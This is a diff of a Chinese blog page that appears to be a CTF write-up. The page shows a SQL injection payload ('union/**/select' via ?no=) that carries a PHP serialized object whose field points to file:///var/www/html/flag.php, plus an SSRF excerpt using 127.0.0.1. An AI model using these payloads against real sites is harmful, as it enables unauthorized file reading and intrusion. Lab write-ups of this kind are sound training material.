@@ -457,6 +457,7 @@
 <p>O:8:”UserInfo”:3:{s:4:”name”;s:1:”2”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p>
 <p>然后我们在url除进行注入?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”2”;s:3:”age”;i:0;s:4:”blog”;s:23:”file:///var/www/html/flag.php”;}’</p>
 <p>只有完整的flag.php的名字才可以成功</p>
+<p>另外我们再写先买呢的注入的时候，记得把？no=0,-1,不要写里面已经存在的数字</p>
 
   
   
@@ -491,7 +492,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-07T10:20:30+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-07T11:20:12+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Mar 7, 2021</p>
@@ -566,6 +567,16 @@
 
   
     <div class="prev-next">
+      
+        <a class='prev' href='/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ssrf(简单的做一下)</p>
+          <p class='content'>
+
+
+这里面的几个函数，上个题目做的时候已经介绍过，整段代码就是输入url把这个界面的内容输出
+我们输入url=127.0.0.1,会发现它又把整端代码从新返回了一下
+所以我们尝试输入127.0...</p>
+        </a>
       
       
         <a class='next' href='/2021/03/06/nizhuansiwei/'>
